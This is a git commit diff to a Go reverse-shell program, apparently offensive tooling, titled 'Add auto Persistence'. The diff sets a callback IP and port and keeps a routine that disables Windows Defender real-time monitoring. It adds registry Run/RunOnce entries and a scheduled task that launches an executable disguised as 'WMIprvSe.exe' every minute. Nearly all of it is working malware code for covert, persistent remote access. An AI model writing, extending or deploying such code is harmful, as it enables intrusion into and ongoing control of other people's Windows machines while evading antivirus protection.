705939706dea5128544fa2cbebf9d86f18ba1813
Daniil <mironovadasha1975@gmail.com>
2024-09-01 15:39:43 +0300

    Add auto Persistence

--- Reverse_Shell.go
+++ Reverse_Shell.go
@@ -9,11 +9,16 @@ import (
 )
 
 var (
-	a1 = "ip"
+	a1 = "192.168.0.3"
 	a2 = 4345
 )
 
-// Set-MpPreference -DisableRealtimeMonitoring $true
+const (
+	registry_RUN            = `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
+	registry_RunOnce        = `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce`
+	registry_RunServices    = `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices`
+	registry_RunServiceOnce = `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
+)
 
 func d1() {
 	c := exec.Command("cmd", "/C", "powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true")
@@ -24,6 +29,44 @@ func d1() {
 		fmt.Println(string(output))
 	}
 }
+
+func d2() {
+	command := func(registry string) {
+		pth, err := os.Getwd()
+		if err != nil {
+			fmt.Println("[-] Error getting current directory:", err)
+		}
+		pth = pth + "\\WMIprvSe.exe"
+		c := exec.Command("cmd", "/C", "reg", "add", registry, "/v", "PentestPersist", "/t", "REG_SZ", "/d", pth)
+		if err := c.Run(); err != nil {
+			fmt.Println("Error: ", err)
+		} else {
+			fmt.Println("[+] Successful add to", registry, "[+]")
+		}
+	}
+	go command(registry_RUN)
+	go command(registry_RunOnce)
+	go command(registry_RunServices)
+	go command(registry_RunServiceOnce)
+}
+
+func d3() {
+	command := func() {
+		pth, err := os.Getwd()
+		if err != nil {
+			fmt.Println("[-] Error getting current directory:", err)
+		}
+		pth = pth + "\\WMIprvSe.exe"
+		c := exec.Command("cmd", "/C", "SCHTASKS", "/Create", "/SC", "MINUTE", "/TN", "spawn", "/TR", pth)
+		if err := c.Run(); err != nil {
+			fmt.Println("Error: ", err)
+		} else {
+			fmt.Println("[+] Successful add to Schedule(SCHTASKS)", "[+]")
+		}
+	}
+	go command()
+}
+
 func e1() {
 	if a1 == "0.0.0.0" || a2 == 0 {
 		fmt.Fprintln(os.Stderr, "[ERROR] a1 and/or a2 not defined.")
@@ -59,6 +102,8 @@ func e3(c net.Conn) {
 
 func main() {
 	d1()
+	d2()
+	d3()
 	e1()
 	c := e2()
 	e3(c)
